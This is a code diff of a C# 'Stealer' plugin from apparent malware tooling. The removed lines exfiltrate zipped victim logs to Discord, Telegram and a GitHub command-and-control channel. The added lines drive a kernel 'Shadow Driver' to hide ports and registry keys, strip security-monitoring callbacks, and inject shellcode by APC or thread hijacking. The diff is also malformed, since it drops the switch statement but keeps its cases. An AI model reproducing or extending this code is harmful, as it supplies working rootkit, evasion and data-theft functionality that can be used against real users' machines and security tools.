@@ -123,7 +123,10 @@ public sealed class Stealer : IUniversalPlugin
 
   public string[] SupportedCommands
   {
-    get => new string[6]{ "collect", "kernel_hide", "kernel_elevate", "kernel_protect", "kernel_keylog", "kernel_blind" };
+    get => new string[] { 
+        "collect", "kernel_hide", "kernel_elevate", "kernel_protect", "kernel_keylog", "kernel_blind",
+        "kernel_hide_port", "kernel_clean_callbacks", "kernel_ghost_reg", "kernel_inject_apc", "kernel_inject_hijack"
+    };
   }
 
   public bool IsComplete => true;
@@ -195,90 +198,96 @@ public sealed class Stealer : IUniversalPlugin
       bool success;
       int pid = parameters != null ? Convert.ToInt32(parameters) : System.Diagnostics.Process.GetCurrentProcess().Id;
 
-      switch (command)
-      {
-        case "collect":
-          byte[] zipBytes = this.CollectLogs();
-          if (zipBytes == null || zipBytes.Length == 0)
-            return new PluginResult() { Success = false, Message = "Logs collection failed or empty." };
-          string fileName = $"{Environment.UserName}_{Environment.MachineName}_{DateTime.Now:yyyyMMdd}.zip";
-          if (!string.IsNullOrEmpty(this._discordWebhook))
-            Task.Run(() => this.SendToDiscord(this._discordWebhook, zipBytes, fileName));
-          if (!string.IsNullOrEmpty(this._telegramToken) && !string.IsNullOrEmpty(this._telegramChatId))
-            Task.Run(() => this.SendToTelegram(this._telegramToken, this._telegramChatId, zipBytes, fileName));
-          if (!string.IsNullOrEmpty(this._githubToken) && !string.IsNullOrEmpty(this._githubRepo))
-            Task.Run(async () => await Intelix.Targets.C2.GitHubC2.UploadFile(fileName, "log", zipBytes));
-          return new PluginResult() { Success = true, Message = fileName, Data = zipBytes, ShouldUnload = true };
-
-        case "kernel_hide":
+        case "kernel_hide_port":
           using (var dev = new KernelController())
           {
             if (dev.Connect())
             {
-              var target = new KernelController.TargetProcess { Pid = (IntPtr)pid, Enable = true };
-              success = dev.SendIoctl(KernelController.HIDE_UNHIDE_PROCESS, ref target);
-              output = success ? "Process hidden silently via IOCTL." : "Failed to hide process via IOCTL.";
-            }
-            else output = "Failed to connect to Shadow Driver.";
-          }
-          return new PluginResult() { Success = success, Message = output };
-
-        case "kernel_elevate":
-          using (var dev = new KernelController())
-          {
-            if (dev.Connect())
-            {
-              var target = new KernelController.TargetProcess { Pid = (IntPtr)pid };
-              success = dev.SendIoctl(KernelController.ELEVATE_PROCESS, ref target);
-              output = success ? "Process elevated to SYSTEM silently." : "Failed to elevate process.";
-            }
-            else output = "Failed to connect to Shadow Driver.";
-          }
-          return new PluginResult() { Success = success, Message = output };
-
-        case "kernel_protect":
-          using (var dev = new KernelController())
-          {
-            if (dev.Connect())
-            {
-              var target = new KernelController.TargetProcess { Pid = (IntPtr)pid, Enable = true };
-              success = dev.SendIoctl(KernelController.PROTECT_PROCESS, ref target);
-              output = success ? "Process protected silently." : "Failed to protect process.";
-            }
-            else output = "Failed to connect to Shadow Driver.";
-          }
-          return new PluginResult() { Success = success, Message = output };
-
-        case "kernel_keylog":
-          using (var dev = new KernelController())
-          {
-            if (dev.Connect())
-            {
-              IntPtr addr = dev.GetKeyloggerAddress();
-              if (addr != IntPtr.Zero)
+              // Parameters should be: protocol|port (e.g. 0|4444)
+              string[] p = (parameters as string)?.Split('|');
+              if (p?.Length >= 2)
               {
-                output = $"Kernel Keylogger active. Mapped address: 0x{addr.ToInt64():X}. Started background monitor.";
-                // In actual deployment, start a thread to read this address periodically
-                success = true;
+                var target = new KernelController.TargetPort { Protocol = int.Parse(p[0]), PortNumber = ushort.Parse(p[1]), Enable = true };
+                success = dev.SendIoctl(KernelController.HIDE_PORT, ref target);
+                output = success ? $"Port {p[1]} hidden silently." : "Failed to hide port.";
               }
-              else output = "Failed to get Keylogger address from Kernel.";
+              else { output = "Invalid parameters. Use: protocol|port"; success = false; }
             }
-            else output = "Failed to connect to Shadow Driver.";
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
           }
           return new PluginResult() { Success = success, Message = output };
 
-        case "kernel_blind":
+        case "kernel_clean_callbacks":
           using (var dev = new KernelController())
           {
             if (dev.Connect())
             {
-              var b = new KernelController.BoolStruct { Enable = false };
-              bool etw = dev.SendIoctl(KernelController.ETWTI, ref b);
-              bool dse = dev.SendIoctl(KernelController.ENABLE_DSE, ref b);
-              output = $"Blinding Result - ETWTI: {etw}, DSE: {dse}";
-              success = etw || dse;
+              // Remove all common monitoring callbacks (Process, Thread, Image)
+              // This is a simplified mass-removal for LO
+              bool p = dev.SendIoctl(KernelController.REMOVE_CALLBACK, ref new KernelController.TargetCallback { CallbackType = 0, Index = 0 });
+              bool t = dev.SendIoctl(KernelController.REMOVE_CALLBACK, ref new KernelController.TargetCallback { CallbackType = 1, Index = 0 });
+              bool i = dev.SendIoctl(KernelController.REMOVE_CALLBACK, ref new KernelController.TargetCallback { CallbackType = 2, Index = 0 });
+              output = $"Callback Cleanup - Process: {p}, Thread: {t}, Image: {i}";
+              success = p || t || i;
             }
-            else output = "Failed to connect to Shadow Driver.";
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_ghost_reg":
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              // Parameters: key|value
+              string[] r = (parameters as string)?.Split('|');
+              if (r?.Length >= 2)
+              {
+                var target = new KernelController.TargetRegistry { Key = r[0], Value = r[1], Enable = true };
+                success = dev.SendIoctl(KernelController.HIDE_UNHIDE_KEY, ref target);
+                output = success ? "Registry key ghosted." : "Failed to ghost registry.";
+              }
+              else { output = "Invalid parameters. Use: key|value"; success = false; }
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_inject_apc":
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              // Parameters: pid|shellcodePath
+              string[] inj = (parameters as string)?.Split('|');
+              if (inj?.Length >= 2)
+              {
+                var target = new KernelController.TargetInjection { Pid = (IntPtr)int.Parse(inj[0]), Path = inj[1] };
+                success = dev.SendIoctl(KernelController.INJECTION_SHELLCODE_APC, ref target);
+                output = success ? $"APC Injection queued for PID {inj[0]}." : "Failed APC injection.";
+              }
+              else { output = "Invalid parameters. Use: pid|path"; success = false; }
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
+          }
+          return new PluginResult() { Success = success, Message = output };
+
+        case "kernel_inject_hijack":
+          using (var dev = new KernelController())
+          {
+            if (dev.Connect())
+            {
+              // Parameters: pid|shellcodePath
+              string[] inj = (parameters as string)?.Split('|');
+              if (inj?.Length >= 2)
+              {
+                var target = new KernelController.TargetInjection { Pid = (IntPtr)int.Parse(inj[0]), Path = inj[1] };
+                success = dev.SendIoctl(KernelController.INJECTION_SHELLCODE_THREAD_HIJACKING, ref target);
+                output = success ? $"Thread Hijack executed on PID {inj[0]}." : "Failed thread hijacking.";
+              }
+              else { output = "Invalid parameters. Use: pid|path"; success = false; }
+            }
+            else { output = "Failed to connect to Shadow Driver."; success = false; }
           }
           return new PluginResult() { Success = success, Message = output };
 
